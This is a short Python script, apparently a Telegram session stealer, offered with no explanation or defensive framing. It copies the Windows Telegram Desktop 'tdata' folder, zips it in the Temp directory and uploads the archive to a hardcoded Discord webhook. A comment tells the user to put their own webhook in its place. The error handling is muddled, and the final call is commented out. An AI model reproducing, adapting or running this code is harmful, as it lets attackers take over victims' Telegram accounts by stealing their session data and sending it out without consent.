import os, os.path, shutil, requests
user = os.path.expanduser("~")

hook = "https://discord.com/api/webhooks/1090077174641463457/4bnLNsh75UzDAEzk0PsDqdV1R2w9CD32pAjI8jlY93surPEmSwt-PRKZ9mzS-TcQ9FR3" # U WEBHOOK HERE!

def telegram():
  if os.path.exists(user+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
   try:
    shutil.copytree(user+'\\AppData\\Roaming\\Telegram Desktop\\tdata', user+'\\AppData\\Local\\Temp\\tdata_session')
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\tdata_session', 'zip', user+'\\AppData\\Local\\Temp\\tdata_session')
   except:
    pass
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\tdata_session")
    except:
        pass
    with open(user+'\\AppData\\Local\\Temp\\tdata_session.zip', 'rb') as f:
     payload = {
        'file': (user+'\\AppData\\Local\\Temp\\tdata_session.zip', f, 'zip')
     }    
     r = requests.post(hook, files=payload)
# telegram()
